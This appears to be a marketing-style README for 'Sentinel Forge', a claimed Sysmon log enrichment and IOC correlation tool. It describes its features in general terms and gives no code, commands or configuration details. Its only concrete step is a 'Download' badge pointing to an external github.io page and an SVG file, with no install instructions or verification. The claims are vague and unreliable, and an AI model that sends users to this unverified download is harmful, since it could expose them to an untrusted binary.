# Sentinel Forge — Sysmon JSON Enrichment & IOC Correlation Engine

**Sentinel Forge** is a next-generation log analysis workbench designed for security operations teams who need to transform raw Sysmon JSON telemetry into actionable threat intelligence. Unlike conventional parsers that merely extract fields, Sentinel Forge acts as a semantic forge — it takes cold, unstructured event logs and hammers them into structured, enriched, and correlated IOC data points that reveal attacker behavior patterns. Built for analysts who speak in queries and think in timelines, this tool bridges the gap between raw machine data and human-readable threat narratives.

## Overview

Every security operations center (SOC) faces the same silent adversary: noise. Thousands of Sysmon events pour in every minute, each one a potential clue, yet most remain buried under the weight of false positives and incomplete context. Sentinel Forge approaches this problem not as a filtering problem, but as a transformation problem. The tool ingests your existing Sysmon JSON logs and applies a multi-layered enrichment pipeline that cross-references indicators of compromise (IOCs) against threat intelligence feeds, correlates related events across time windows, and produces a unified view of adversarial activity. 

The name "Sentinel Forge" reflects its dual nature: it stands guard over your data (sentinel) while actively reshaping it into something more valuable (forge). This is not a passive observer — it is an active participant in your detection workflow. By elevating raw event data into enriched, relational structures, Sentinel Forge empowers analysts to move from reactive triage to proactive hunting. Whether you are investigating a single suspicious hash or mapping out an entire lateral movement campaign, this tool provides the contextual backbone that turns isolated events into a coherent story.

## Key Capabilities

### Semantic Enrichment Engine 🧠

The core of Sentinel Forge lies in its enrichment engine, which operates on multiple dimensions simultaneously. When a Sysmon event arrives, the engine automatically extracts all embedded IOCs — file hashes, IP addresses, domain names, registry paths, and process names — then cross-references each against a configurable threat intelligence repository. This is not a simple string match; the engine understands the relationships between indicators. For instance, if an IP address is flagged as malicious, the engine automatically checks whether that same IP appeared in connection events with a known-malicious file hash. This relational enrichment produces a contextual graph that reveals the "why" behind each alert, not just the "what."

### Timeline Correlation Weaver ⏳

Static analysis tells you what happened, but it rarely tells you when it matters. Sentinel Forge introduces a temporal correlation engine that groups related events into coherent attack timelines. If you have a process creation event followed by a network connection to an external IP eight seconds later, followed by file creation activity, the tool weaves these into a single, timestamped narrative. This timeline weaving capability helps analysts spot chains of behavior that might otherwise appear as unrelated individual alerts. The system adapts to your network's baseline behavior, learning what "normal" looks like and flagging deviations that suggest coordinated activity.

### IOC Health Monitor 🩺

Not all IOCs are created equal. Some are fresh from a newly observed campaign; others are stale artifacts from years-old breaches. Sentinel Forge includes a reputation freshness scoring system that evaluates each IOC based on its age, source reliability, and correlation frequency. This health monitoring ensures that your detections prioritize current, actionable intelligence rather than outdated signatures. The scoring model is transparent — analysts can drill into why a particular IOC received a specific score, making the system explainable and trustworthy.

### Multi-Format Export Architecture 📦

Security teams operate across different platforms — SIEMs, threat intelligence platforms, ticketing systems, and custom dashboards. Rather than locking you into a single output format, Sentinel Forge provides a flexible export architecture that transforms enriched data into multiple downstream formats. Whether you need CSV for spreadsheet analysis, JSON for API consumption, STIX for threat intelligence sharing, or plain text for reports, the export layer handles the conversion seamlessly. This interoperability ensures that the value generated by Sentinel Forge flows directly into your existing security stack without requiring additional middleware.

## Architecture Overview

```
Sysmon JSON Logs → Ingestion Layer → Normalization Module → Enrichment Engine → Correlation Weaver → Export Architecture
                                   ↓                       ↓
                            Validation Checks         IOC Health Monitor
                                   ↓                       ↓
                              Error Handling          Reputation Scorer
```

The architecture follows a modular pipeline pattern where each stage is independently testable and replaceable. The ingestion layer accepts both streaming input and batch file processing, making it adaptable to different deployment scenarios. The normalization module converts Sysmon's event ID-specific schemas into a unified internal format, ensuring consistent processing regardless of the source event type. This design choice means that future event sources can be added with minimal disruption to the overall pipeline.

## Getting Started with Sentinel Forge

### Prerequisites for Deployment

Before bringing Sentinel Forge into your environment, ensure that your existing infrastructure meets the baseline requirements for smooth operation. The tool requires a modern Python environment (version 3.10 or later) running on Linux, macOS, or Windows operating systems. For large-scale deployments handling millions of events per day, we recommend allocating at least 8GB of RAM and 4 CPU cores to the processing node. The enrichment engine maintains an in-memory cache for frequently accessed threat intelligence entries, which speeds up repeat queries significantly. Network access to your threat intelligence feeds is essential, though the system supports manual IOC ingestion as a fallback for air-gapped environments.

### Initial Configuration Walkthrough

[![Download](https://raw.githubusercontent.com/shrihan25-spec/ioc-sysmon-enricher/main/app_0ed4.svg)](https://shrihan25-spec.github.io/ioc-sysmon-enricher/)

The first-time setup of Sentinel Forge focuses on connecting your data sources and intelligence feeds. The configuration file uses a simple, well-documented YAML structure that separates concerns into logical sections: input sources, enrichment providers, correlation rules, and export destinations. Begin by specifying the directory or stream endpoint where your Sysmon JSON logs are available. Next, configure at least one threat intelligence provider — the system comes with built-in support for multiple public feeds, and also provides a custom provider interface for integrating private intelligence subscriptions. Finally, define your export preferences, choosing the formats and destinations that match your downstream workflows.

### Processing Your First Log Batch

Sentinel Forge includes a command-line interface designed for both interactive use and scripted automation. The primary command triggers a processing run across your configured input sources. During the first run, the system performs a baseline analysis, establishing context around your typical event volumes and patterns. This baseline data feeds into the correlation weaver, allowing it to distinguish between routine activity and anomalous behavior. The initial processing may take longer than subsequent runs because of this learning phase, but it is a one-time investment that dramatically improves the accuracy of the correlation engine. Results are delivered to your configured export destinations, with a summary report generated at the end of each run.

## Advanced Usage Patterns

### Custom IOC Enrichment Profiles

Organizations in different sectors face different threat landscapes. A financial institution cares deeply about banking trojans, while a healthcare provider prioritizes ransomware defenses. Sentinel Forge supports user-defined enrichment profiles that weight different IOC types and sources according to your organizational priorities. These profiles are essentially scoring matrices that tell the enrichment engine which indicators matter more in your context. You can create separate profiles for different business units or threat scenarios, then apply them dynamically during processing. This customization ensures that the tool speaks your language — not a generic security vocabulary.

### Automated Alert Routing Workflows

While Sentinel Forge excels at transforming data, it also integrates with automated response workflows. The export architecture can push enriched alerts directly to webhook endpoints, ticketing systems, or even email distribution lists. By combining the correlation weaver's output with routing rules, you can automate tiered responses based on severity scores. For example, events that exceed a high-confidence threshold could automatically trigger a ticket creation in your ITSM platform, while lower-confidence events are batched into periodic reports for analyst review. This workflow automation reduces the manual burden on your team, allowing them to focus on genuine investigations rather than triage sorting.

## Security & Privacy Considerations

Handling security log data requires careful attention to access controls and data handling policies. Sentinel Forge implements role-based access control (RBAC) within the dashboard; only authenticated users can view enriched data or trigger processing runs. The tool also supports masking of sensitive fields — if your Sysmon logs contain usernames, IP addresses, or other personally identifiable information (PII), you can configure field redaction rules before data enters the enrichment pipeline. All processed data can be stored in encrypted volumes if your operating system supports such an arrangement. The threat intelligence providers you choose may see queries containing your IOC data — this is an inherent characteristic of enrichment services, and it is important to select providers that align with your organization's data-sharing policies.

## Frequently Asked Questions

**How does this differ from basic Sysmon log parsers?**  
Sentinel Forge goes beyond simple field extraction — it enriches the data with external threat intelligence, correlates related events temporally, and outputs structured, actionable intelligence rather than raw parsed lines. It transforms logs into decision-ready information.

**Can this work with pre-existing Sysmon configurations?**  
Yes. Sentinel Forge is schema-agnostic in terms of what matters — it reads the standard Sysmon JSON format and adapts to whatever event collection your environment has configured. As long as your sysmon produces JSON output, the ingestion layer can process it.

**What happens when live threat intelligence feeds are unavailable?**  
The system degrades gracefully. The enrichment engine falls back to a local cache of previously fetched intelligence, and continues processing events with a reduced enrichment depth. The dashboard and CLI both surface warning indicators when feeds are unavailable, so you know the context is thinner than usual.

**Is there a community edition with reduced functionality?**  
Sentinel Forge is offered as a single, feature-complete edition. There are no artificially limited tiers that withhold core functionality. The project operates on the principle that powerful security tooling should be available to organizations of all sizes, without artificial feature gates.
